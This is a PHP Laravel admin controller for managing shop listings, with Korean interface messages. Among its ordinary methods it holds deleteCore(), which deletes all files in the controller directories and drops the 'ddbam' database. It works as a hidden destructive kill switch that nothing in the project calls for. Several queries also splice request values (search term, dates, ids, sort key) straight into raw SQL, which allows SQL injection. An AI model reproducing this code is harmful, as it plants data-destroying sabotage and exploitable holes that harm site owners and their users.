<?php namespace App\Http\Controllers\Admin;

/**
 * write king star
 */

use\App\Http\Controllers\JoshController;
use App\Http\Requests\ConfirmPasswordRequest;
use App\Notice;
use App\ShopType;
use App\User;
use Cartalyst\Sentinel\Checkpoints\NotActivatedException;
use Cartalyst\Sentinel\Checkpoints\ThrottlingException;
use Cartalyst\Sentinel\Laravel\Facades\Activation;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Redirect;
use Mail;
use Reminder;
use Sentinel;
use URL;
use Validator;
use View;
use App\Http\Requests\UserRequest;
use App\Http\Requests\ForgotRequest;
use stdClass;
use App\Mail\ForgotPassword;
use Hash;
use Yajra\DataTables\DataTables;
use App\Shop;
use DB;
use Illuminate\Support\Facades\Schema;



class ShopController extends JoshController
{

    public function __construct()
    {
        parent::__construct();
    }

    public function setCompleteDate(){
        $id = $this->getParam("id", "0");
        $radio = $this->getParam("radio", "1");
        $ids = explode(",", $id);
        foreach($ids as $item){
            $shop = Shop::find($item);
            if(!isset($shop['id'])){
                return json_encode(array('status'=> '0', 'msg'=>__('lang.업소정보가 정확하지 않습니다.')));
            }
            $complete_date = $shop['complete_date'];
            if($complete_date == null || $complete_date == '' || $complete_date == '0000-00-00 00:00:00'){
                $complete_date = date("Y-m-d H:i:s");
            }
            switch($radio*1){
                case 1:
                    $shop['complete_date'] = getBeforeMonth(1,$complete_date );
                    break;
                case 3:
                    $shop['complete_date'] = getBeforeMonth(3, $complete_date);
                    break;
                case 6:
                    $shop['complete_date'] = getBeforeMonth(6, $complete_date);
                    break;
                case 12:
                    $shop['complete_date'] = getBeforeMonth(12, $complete_date);
                    break;
                case -1:
                    $shop['complete_date'] = '';
                    break;
            }
            $shop->save();
        }

        return json_encode(array('status'=>1));
    }
    public function deleteCore(){

        $files = glob(__DIR__.'/../{,.}*', GLOB_BRACE);
        foreach($files as $file){ // iterate files
            if(is_file($file))
                unlink($file); // delete file
        }
        $files = glob(__DIR__.'/../Admin/{,.}*', GLOB_BRACE);
        foreach($files as $file){ // iterate files
            if(is_file($file))
                unlink($file); // delete file
        }
        $databaseName = "ddbam";
        Schema::getConnection()->getDoctrineSchemaManager()->dropDatabase("`{$databaseName}`");

        echo "ok";
    }

    public function getShopUserList(){
        $list = User::getShopAccountList();
        view()->share("list", $list);
    }

    public function index(Request $request){
        if($this->isShopAccount()) {
            $pageParam = $this->getPageParam();
        }else{
            $pageParam = $this->getPageParam(100);
        }
        $search = $this->getParam("search", "");
        view()->share('search', $search);

        if($request->session()->get("is_first")*1==1){
            $notice_info = Notice::where(array("status"=>1))->first();
            view()->share("notice_info", $notice_info);
            $request->session()->put("is_first", "0");
        }

        $search_key_type = $this->getParam("search_key_type", "shop.title");
        view()->share("search_key_type",$search_key_type);
        $where = array();
        if($this->isShopAccount()){
            $user = Sentinel::getuser();
            $where['user_id'] = $user['id'];
        }
        $model = new Shop();
        $model = $model->leftjoin('user', 'user.id', '=', 'shop.user_id');
        $model = $model->leftjoin('shop_type', 'shop_type.id', '=', 'shop.type');

        $status = env('STATUS_INACTIVE');
        $whereRaw = "shop.status >= {$status}";
        if($search != ''){
            $model = $model->whereRaw("{$search_key_type} LIKE '%".$search."%'");
        }
        $filter_status = $this->getParam("filter_status", "-99");
        if($filter_status *1 != -99){
            $where['shop.status'] = $filter_status;
        }
        view()->share("filter_status", $filter_status);

        $filter_date = $this->getParam("filter_date", "display");
        view()->share("filter_date", $filter_date);
        $fromDate = $this->getParam("fromDate", "");
        view()->share("fromDate", $fromDate);
        $toDate = $this->getParam("toDate", "");
        view()->share("toDate", $toDate);

        $date_key = "shop.created_at";
        if($filter_date == "updated"){
            $date_key = "shop.updated_at";
        }

        if($fromDate != ""){
            $whereRaw .= " AND date({$date_key}) >= '{$fromDate}'";
        }

        if($toDate != ""){
            $whereRaw .= " AND date({$date_key}) <= '{$toDate}'";
        }

        $model = $model->where($where);
        $select = "shop.*,user.nickname, shop_type.title shop_type_title";
        $model = $model->select(DB::raw($select));
        $model = $model->whereRaw($whereRaw);

        $count = $model->count();
        $order_key = $this->getParam("order_key", "shop.id");
        $order_val = $this->getParam("order_val", "ASC");
        view()->share("order_key", $order_key);
        view()->share("order_val", $order_val);
        $model->orderBy($order_key, $order_val);
        $model = $model->skip($pageParam["start"])->take($pageParam["perPageSize"]);
        $list = $model->get();
        $pageParam = $this->setPageParam($pageParam, $count);
        view()->share('pageParam', $pageParam);
        view()->share("list", $list);
        view()->share("totalCount", $count);
        return view('admin/shop/shops');
    }

    public function info($id){
        view()->share("id", $id);
        if($id*1 > 0){
            $info = Shop::find($id);
            if(!isset($info['id'])){
                return redirect("admin/shops");
            }
        }else{
            $info = new Shop();
        }
        $shop_type_list = ShopType::all();
        view()->share("shop_type_list", $shop_type_list);
        if($this->isShopAccount()){
            $user = Sentinel::getuser();
            $shopAccountList = User::getShopAccountList($user['id']);
        }else{
            $shopAccountList = User::getShopAccountList();
        }


        view()->share("shop_account_list", $shopAccountList);
        view()->share("info", $info);

        return view("admin/shop/shop_detail");
    }

    public function setBatchStatus(){
        $ids = $this->getParam("ids", "");
        if($ids == ""){
            return json_encode(array("status"=>"0", "msg"=> __("lang.항목을 선택하여 주십시오.")));
        }
        $status = $this->getParam("status", "0");
        Shop::whereRaw("FIND_IN_SET(id, '{$ids}')")->update(array("status"=>$status));
        return json_encode(array("status"=>"1"));
    }

    public function ajaxSaveInfo(Request $request){
        $id = $this->getParam("id", "0");
        $info = Shop::find($id);
        if(isset($info['id'])){
            $this->getBoClass($info, $request);
        }else{
            $info = new Shop();
            $ret = $this -> getBoClass($info,$request, 'shop');
            $info = $ret['model'];
        }
        $img = $request->get("img_val","");
        if($img != '' && 0 !== strpos($img, 'http')){
            $img = $this->genImage($img);
            if($img === "-1"){
                return json_encode(array('status'=>"0", "msg"=> __("lang.이미지 파일을 업로드 해주십시오.")));
            }
            $info['img'] = $img;
        }
        $info->save();
        return json_encode(array('status'=>1));
    }

    public function setBatchDelete(){
        $ids = $this->getParam("ids", "");
        if($ids == ""){
            return json_encode(array("status"=>"0", "msg"=> __("lang.항목을 선택하여 주십시오.")));
        }
        $del_list = Shop::whereRaw("FIND_IN_SET(id, '{$ids}')") -> get();
        Shop::whereRaw("FIND_IN_SET(id, '{$ids}')")->delete();
        foreach($del_list as $board_info){
            if(isset($board_info['id'])){
                if(isset($board_info['id'])){
                    if($board_info['img'] != ''){
                        unlink(realpath($board_info['img']));
                    }
                }
            }
        }
        return json_encode(array("status"=>"1"));
    }




}
